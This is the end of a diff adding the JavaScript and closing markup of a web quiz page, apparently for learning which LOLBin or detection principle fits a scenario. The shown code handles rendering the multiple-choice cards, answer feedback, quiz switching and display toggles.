+function renderScenarios(){if(!scenarioDeck.length||scenarioCursor>=scenarioDeck.length)freshScenarioDeck();const batch=scenarioDeck.slice(scenarioCursor,scenarioCursor+4);const start=scenarioCursor+1,end=scenarioCursor+batch.length;$('#coveragePill').textContent=`Questions ${start}–${end} of ${SCENARIOS.length}`;host.innerHTML=`<h2>Which LOLBin or detection principle best fits?</h2><p class="hint">Immediate feedback. You can change your selection. The correct answer is not auto-revealed after a wrong click; try again.</p><div class="mcq-list" id="mcqList"></div><div class="controls"><button id="nextSet" class="primary">Next Set</button><button id="restartScenarios">Restart Coverage Cycle</button></div>`;
+ const list=$('#mcqList');batch.forEach(s=>{const card=document.createElement('div');card.className='mcq';card.dataset.id=s.id;card.innerHTML=`<div class="mcq-q">${s.q}</div><div class="cmd">${s.cmd}</div><div class="mcq-opts"></div><div class="mcq-why"></div>`;const opts=card.querySelector('.mcq-opts'),why=card.querySelector('.mcq-why');scenarioOptions(s).forEach(o=>{const b=document.createElement('button');b.className='opt';b.type='button';b.textContent=o.name;b.onclick=()=>{card.querySelectorAll('.opt').forEach(x=>x.classList.remove('correct'));const isCorrect=o.id===s.a;if(isCorrect){b.classList.remove('wrong');b.classList.add('correct');why.innerHTML=`<b>Correct.</b> ${s.why}`;why.classList.add('show');scenarioAnswered.add(s.id)}else{b.classList.add('wrong');why.innerHTML=`<b>Not the best match.</b> Re-read the command/behavior clue and compare it with the core abuse patterns.`;why.classList.add('show')}setScore(`${scenarioAnswered.size} correct seen`)};opts.appendChild(b)});list.appendChild(card)});
+ $('#nextSet').onclick=()=>{scenarioCursor+=batch.length;if(scenarioCursor>=scenarioDeck.length){freshScenarioDeck()}renderScenarios()};$('#restartScenarios').onclick=()=>{freshScenarioDeck();renderScenarios();setScore('Not graded')};
+}
+function render(){
+ clearSelected();setScore('Not graded');const m=META[current];$('#quizTitle').textContent=m.title;$('#sectionBadge').textContent=m.badge;$('#quizDesc').textContent=m.desc;$('#coveragePill').textContent=current==='scenarios'?'Coverage cycle':'All items shown';
+ if(current==='windows')renderMatch(WINDOWS,'windows');else if(current==='linux')renderMatch(LINUX,'linux');else if(current==='platform')renderPlatform();else renderScenarios();
+}
+$('#quizSelect').addEventListener('change',e=>{current=e.target.value;render()});
+$('#resetBtn').onclick=()=>render();
+$('#cheatBtn').onclick=()=>{document.body.classList.toggle('cheats-hidden');$('#cheatBtn').textContent=document.body.classList.contains('cheats-hidden')?'📚 Show Cheats':'📚 Hide Cheats'};
+$('#darkBtn').onclick=()=>{document.body.classList.toggle('dark');$('#darkBtn').textContent=document.body.classList.contains('dark')?'☀️ Light':'🌙 Dark'};
+document.addEventListener('keydown',e=>{if(e.key==='Escape')clearSelected()});document.addEventListener('click',e=>{if(!e.target.closest('.chip,.slot,.bucket'))clearSelected()});
+freshScenarioDeck();render();
+</script>
+</body>
+</html>
